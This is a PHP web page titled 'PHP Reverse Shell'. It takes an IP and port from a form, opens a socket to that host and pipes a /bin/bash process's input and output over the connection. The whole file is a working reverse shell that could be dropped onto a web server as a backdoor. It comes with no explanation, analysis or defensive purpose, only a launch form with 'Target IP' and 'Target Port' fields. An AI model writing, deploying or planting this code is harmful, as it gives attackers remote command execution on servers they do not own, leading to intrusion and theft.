<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Reverse Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        input, button {
            display: block;
            margin-bottom: 15px;
            padding: 10px;
            width: 100%;
            max-width: 500px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .success {
            color: green;
        }
        .error {
            color: red;
        }
    </style>
</head>
<body>
    <h1>PHP Reverse Shell</h1>
    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $ip = $_POST['ip'] ?? '';
        $port = $_POST['port'] ?? '';

        // Trim and sanitize input
        $ip = trim($ip);
        $port = intval(trim($port));

        if (empty($ip) || empty($port)) {
            echo "<p class='error'>Error: Both IP and Port are required.</p>";
        } else {
            echo "<p class='success'>Attempting to connect to $ip:$port...</p>";

            // Reverse shell logic
            try {
                $sock = fsockopen($ip, $port);
                if ($sock) {
                    fwrite($sock, "Connection established to $ip:$port\n");

                    // Redirect standard streams
                    $descriptorspec = [
                        0 => ["pipe", "r"], // STDIN
                        1 => ["pipe", "w"], // STDOUT
                        2 => ["pipe", "w"], // STDERR
                    ];

                    // Start shell process
                    $process = proc_open('/bin/bash', $descriptorspec, $pipes);

                    if (is_resource($process)) {
                        // Send input/output streams to the socket
                        stream_set_blocking($pipes[1], false);
                        stream_set_blocking($pipes[2], false);
                        stream_set_blocking($sock, false);

                        while (!feof($sock)) {
                            // Read from socket and send to shell
                            $input = fread($sock, 1024);
                            if ($input) {
                                fwrite($pipes[0], $input);
                            }

                            // Read from shell and send to socket
                            $output = fread($pipes[1], 1024);
                            if ($output) {
                                fwrite($sock, $output);
                            }

                            $error = fread($pipes[2], 1024);
                            if ($error) {
                                fwrite($sock, $error);
                            }
                        }

                        fclose($pipes[0]);
                        fclose($pipes[1]);
                        fclose($pipes[2]);
                        proc_close($process);
                    }
                    fclose($sock);
                } else {
                    echo "<p class='error'>Failed to connect to $ip:$port.</p>";
                }
            } catch (Exception $e) {
                echo "<p class='error'>Error: " . $e->getMessage() . "</p>";
            }
        }
    }
    ?>

    <!-- Form for IP and Port input -->
    <form method="POST">
        <label for="ip">Target IP:</label>
        <input type="text" id="ip" name="ip" placeholder="Enter target IP (e.g., 192.168.1.100)" required>

        <label for="port">Target Port:</label>
        <input type="number" id="port" name="port" placeholder="Enter target port (e.g., 4444)" required>

        <button type="submit">Start Reverse Shell</button>
    </form>
</body>
</html>